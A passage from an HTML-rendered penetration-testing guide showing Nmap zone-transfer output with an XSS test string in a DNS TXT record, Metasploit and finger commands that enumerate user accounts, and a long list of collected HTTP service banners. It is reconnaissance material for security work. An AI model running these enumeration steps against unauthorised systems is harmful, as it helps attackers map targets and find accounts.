<span class="o">|</span> <span class="n">staging</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                        <span class="n">CNAME</span>  <span class="n">www</span><span class="o">.</span><span class="n">sydneyoperahouse</span><span class="o">.</span><span class="n">com</span><span class="o">.</span>
<span class="o">|</span> <span class="n">alltcpportsopen</span><span class="o">.</span><span class="n">firewall</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>  <span class="n">A</span>      <span class="mf">127.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">testing</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                        <span class="n">CNAME</span>  <span class="n">www</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">vpn</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">A</span>      <span class="mf">174.36</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">www</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">A</span>      <span class="mf">217.147</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">xss</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">TXT</span>    <span class="s2">&quot;&#39;&gt;&lt;script&gt;alert(&#39;Boo&#39;)&lt;/script&gt;&quot;</span>
<span class="o">|</span><span class="n">_zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">SOA</span>    <span class="n">nsztm1</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span> <span class="n">robin</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">filtered</span> <span class="n">msrpc</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">filtered</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">8333</span><span class="o">/</span><span class="n">tcp</span> <span class="n">filtered</span> <span class="n">bitcoin</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">18.98</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="finger-port-79">
<h2>Finger - Port 79<a class="headerlink" href="#finger-port-79" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id8">
<h3>Metasploit<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h3>
<div class="section" id="finger-service-user-enumerator">
<h4>Finger Service User Enumerator<a class="headerlink" href="#finger-service-user-enumerator" title="Permalink to this headline">¶</a></h4>
<p>Used to identify users.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">finger</span><span class="o">/</span><span class="n">finger_users</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">79</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">adm</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">lp</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">uucp</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">nuucp</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">listen</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="nb">bin</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">daemon</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">gdm</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">noaccess</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">nobody</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">nobody4</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">oracle</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">postgres</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">root</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">svctag</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="o">-</span> <span class="n">Found</span> <span class="n">user</span><span class="p">:</span> <span class="n">sys</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">79</span> <span class="n">Users</span> <span class="n">found</span><span class="p">:</span> <span class="n">adm</span><span class="p">,</span> <span class="nb">bin</span><span class="p">,</span> <span class="n">daemon</span><span class="p">,</span> <span class="n">gdm</span><span class="p">,</span> <span class="n">listen</span><span class="p">,</span> <span class="n">lp</span><span class="p">,</span> <span class="n">noaccess</span><span class="p">,</span> <span class="n">nobody</span><span class="p">,</span> <span class="n">nobody4</span><span class="p">,</span> <span class="n">nuucp</span><span class="p">,</span> <span class="n">oracle</span><span class="p">,</span> <span class="n">postgres</span><span class="p">,</span> <span class="n">root</span><span class="p">,</span> <span class="n">svctag</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">uucp</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id9">
<h3>Nmap<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h3>
<div class="section" id="finger">
<h4>Finger<a class="headerlink" href="#finger" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/finger.html">finger.nse</a>  : Attempts to retrieve a list of usernames using the finger service.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Yet</span> <span class="n">to</span> <span class="n">run</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="other">
<h3>Other<a class="headerlink" href="#other" title="Permalink to this headline">¶</a></h3>
<div class="section" id="id10">
<h4>finger<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
<p>Same can be done using finger command</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">finger</span> <span class="n">root</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">finger</span><span class="p">:</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span> <span class="n">no</span> <span class="n">such</span> <span class="n">user</span><span class="o">.</span>
<span class="n">Login</span><span class="p">:</span> <span class="n">root</span>                            <span class="n">Name</span><span class="p">:</span> <span class="n">root</span>
<span class="n">Directory</span><span class="p">:</span> <span class="o">/</span><span class="n">root</span>                       <span class="n">Shell</span><span class="p">:</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">Last</span> <span class="n">login</span> <span class="n">Sat</span> <span class="n">Feb</span>  <span class="mi">6</span> <span class="mi">22</span><span class="p">:</span><span class="mi">43</span> <span class="p">(</span><span class="n">IST</span><span class="p">)</span> <span class="n">on</span> <span class="n">tty1</span>
<span class="n">No</span> <span class="n">mail</span><span class="o">.</span>
<span class="n">No</span> <span class="n">Plan</span><span class="o">.</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="http">
<h2>HTTP<a class="headerlink" href="#http" title="Permalink to this headline">¶</a></h2>
<p>Let&#8217;s first get a hold of what services are running on the network by checking the different banners</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">c</span> <span class="n">port</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">info</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">http</span><span class="o">.</span><span class="n">ports</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">http</span><span class="o">.</span><span class="n">ports</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="p">,</span> <span class="o">-</span><span class="n">f2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> \<span class="s2">&quot; | grep -v port | sort -n</span>
</pre></div>
</div>
<p>Sample Services running</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="mi">3</span><span class="n">Com</span> <span class="n">switch</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="mi">3</span><span class="n">Com</span> <span class="n">switch</span> <span class="n">webadmin</span> <span class="mf">1.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Agranat</span><span class="o">-</span><span class="n">EmWeb</span> <span class="mf">5.2</span><span class="o">.</span><span class="mi">6</span> <span class="n">HP</span> <span class="n">LaserJet</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Allegro</span> <span class="n">RomPager</span> <span class="mf">4.30</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Allen</span><span class="o">-</span><span class="n">Bradley</span> <span class="mi">1761</span><span class="o">-</span><span class="n">NET</span><span class="o">-</span><span class="n">ENIW</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="n">Tomcat</span> <span class="n">Manager</span> <span class="n">Application</span> <span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">0.6</span><span class="o">.</span><span class="mi">5</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">1.3</span><span class="o">.</span><span class="mi">27</span> <span class="p">(</span><span class="n">Unix</span><span class="p">)</span> <span class="p">(</span><span class="n">Red</span><span class="o">-</span><span class="n">Hat</span><span class="o">/</span><span class="n">Linux</span><span class="p">)</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">4.1</span><span class="o">.</span><span class="mi">2</span> <span class="n">mod_perl</span><span class="o">/</span><span class="mf">1.24</span><span class="n">_01</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.0</span><span class="o">.</span><span class="mi">63</span> <span class="p">(</span><span class="n">CentOS</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">10</span> <span class="p">(</span><span class="n">Fedora</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">15</span> <span class="p">(</span><span class="n">Red</span> <span class="n">Hat</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">17</span> <span class="p">(</span><span class="n">Win32</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">21</span> <span class="p">(</span><span class="n">Win32</span><span class="p">)</span> <span class="n">mod_ssl</span><span class="o">/</span><span class="mf">2.2</span><span class="o">.</span><span class="mi">21</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.0</span><span class="o">.</span><span class="mi">0</span><span class="n">e</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">5.3</span><span class="o">.</span><span class="mi">8</span> <span class="n">mod_perl</span><span class="o">/</span><span class="mf">2.0</span><span class="o">.</span><span class="mi">4</span> <span class="n">Perl</span><span class="o">/</span><span class="n">v5</span><span class="o">.</span><span class="mf">10.1</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">22</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">Red</span> <span class="n">Hat</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">12</span> <span class="p">(</span><span class="n">Unix</span><span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">9</span> <span class="p">(</span><span class="n">Win32</span><span class="p">)</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="o">.</span><span class="mi">12</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">AudioCodes</span> <span class="n">MP</span><span class="o">-</span><span class="mi">202</span> <span class="n">VoIP</span> <span class="n">adapter</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">BenQ</span> <span class="n">projector</span> <span class="n">Crestron</span> <span class="n">RoomView</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Boa</span> <span class="n">HTTPd</span> <span class="mf">0.94</span><span class="o">.</span><span class="mi">14</span><span class="n">rc19</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">BusyBox</span> <span class="n">httpd</span> <span class="mf">1.13</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Canon</span> <span class="n">Pixma</span> <span class="n">IP4000R</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="n">KS_HTTP</span> <span class="mf">1.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Canon</span> <span class="n">printer</span> <span class="n">web</span> <span class="n">interface</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Check</span> <span class="n">Point</span> <span class="n">NGX</span> <span class="n">Firewall</span><span class="o">-</span><span class="mi">1</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">ChipPC</span> <span class="n">Extreme</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Cisco</span> <span class="n">IOS</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Citrix</span> <span class="n">Xen</span> <span class="n">Simple</span> <span class="n">HTTP</span> <span class="n">Server</span> <span class="n">XenServer</span> <span class="mf">5.6</span><span class="o">.</span><span class="mi">100</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Crestron</span> <span class="n">MPS</span><span class="o">-</span><span class="mi">200</span> <span class="n">AV</span> <span class="n">routing</span> <span class="n">system</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Crestron</span> <span class="n">PRO2</span> <span class="n">automation</span> <span class="n">system</span> <span class="n">web</span> <span class="n">server</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Debut</span> <span class="n">embedded</span> <span class="n">httpd</span> <span class="mf">1.20</span> <span class="n">Brother</span><span class="o">/</span><span class="n">HP</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">admin</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Dell</span> <span class="n">N2000</span><span class="o">-</span><span class="n">series</span> <span class="n">switch</span> <span class="n">http</span> <span class="n">admin</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Dell</span> <span class="n">PowerVault</span> <span class="n">TL4000</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">D</span><span class="o">-</span><span class="n">Link</span> <span class="nb">print</span> <span class="n">server</span> <span class="n">http</span> <span class="n">config</span> <span class="mf">1.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Embedthis</span> <span class="n">HTTP</span> <span class="n">lib</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Gembird</span><span class="o">/</span><span class="n">Hawking</span><span class="o">/</span><span class="n">Netgear</span> <span class="nb">print</span> <span class="n">server</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">GoAhead</span> <span class="n">WebServer</span> <span class="n">LinkSys</span> <span class="n">SLM2024</span> <span class="ow">or</span> <span class="n">SRW2008</span> <span class="o">-</span> <span class="n">SRW2016</span> <span class="n">switch</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">GoAhead</span> <span class="n">WebServer</span> <span class="n">Router</span> <span class="k">with</span> <span class="n">realtek</span> <span class="mi">8181</span> <span class="n">chipset</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span><span class="o">-</span><span class="n">ChaiSOE</span> <span class="mf">1.0</span> <span class="n">HP</span> <span class="n">LaserJet</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">Deskjet</span> <span class="mi">3050</span> <span class="n">J610</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="n">Serial</span> <span class="n">CN12E3937Y05HX</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">Integrated</span> <span class="n">Lights</span><span class="o">-</span><span class="n">Out</span> <span class="n">web</span> <span class="n">interface</span> <span class="mf">1.30</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">LaserJet</span> <span class="mi">1022</span><span class="n">n</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="mf">4.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">LaserJet</span> <span class="n">P2014n</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="mf">4.2</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">Officejet</span> <span class="mi">7610</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="n">Serial</span> <span class="n">CN5293M07X064N</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">HP</span> <span class="n">ProCurve</span> <span class="mi">1800</span><span class="o">-</span><span class="mi">24</span><span class="n">G</span> <span class="n">switch</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Jetty</span> <span class="mf">6.1</span><span class="o">.</span><span class="n">x</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Konica</span> <span class="n">Minolta</span> <span class="n">PageScope</span> <span class="n">Web</span> <span class="n">Connection</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Liaison</span> <span class="n">Exchange</span> <span class="n">Commerce</span> <span class="n">Suite</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">lighttpd</span> <span class="mf">1.4</span><span class="o">.</span><span class="mi">33</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Linksys</span> <span class="n">PAP2</span> <span class="n">VoIP</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Lotus</span> <span class="n">Domino</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Mathopd</span> <span class="n">httpd</span> <span class="mf">1.5</span><span class="n">p6</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Mbedthis</span><span class="o">-</span><span class="n">Appweb</span> <span class="mf">2.5</span><span class="o">.</span><span class="mi">0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">8.5</span> <span class="p">(</span> <span class="n">Powered</span> <span class="n">by</span> <span class="n">ASP</span><span class="o">.</span><span class="n">NET</span> <span class="p">)</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">10.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">8.5</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">MoxaHttp</span> <span class="mf">1.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">nginx</span> <span class="mf">1.2</span><span class="o">.</span><span class="mi">2</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Omron</span> <span class="n">PLC</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Oracle</span> <span class="n">HTTP</span> <span class="n">Server</span> <span class="n">Powered</span> <span class="n">by</span> <span class="n">Apache</span> <span class="mf">1.3</span><span class="o">.</span><span class="mi">22</span> <span class="n">mod_plsql</span><span class="o">/</span><span class="mf">3.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mi">3</span><span class="n">b</span> <span class="n">mod_ssl</span><span class="o">/</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">0.9</span><span class="o">.</span><span class="mi">6</span><span class="n">b</span> <span class="n">mod_fastcgi</span><span class="o">/</span><span class="mf">2.2</span><span class="o">.</span><span class="mi">12</span> <span class="n">mod_oprocmgr</span><span class="o">/</span><span class="mf">1.0</span> <span class="n">mod_perl</span><span class="o">/</span><span class="mf">1.25</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Panasonic</span> <span class="n">WV</span><span class="o">-</span><span class="n">NF284</span> <span class="n">webcam</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="p">,</span><span class="n">Squid</span> <span class="n">http</span> <span class="n">proxy</span> <span class="mf">2.5</span><span class="o">.</span><span class="n">STABLE4</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">RapidLogic</span> <span class="n">httpd</span> <span class="mf">1.1</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Samsung</span> <span class="n">SyncThru</span> <span class="n">Web</span> <span class="n">Service</span> <span class="n">M337x</span> <span class="mi">387</span><span class="n">x</span> <span class="mi">407</span><span class="n">x</span> <span class="n">series</span><span class="p">;</span> <span class="n">SN</span><span class="p">:</span> <span class="n">ZDFABJEF600007W</span>
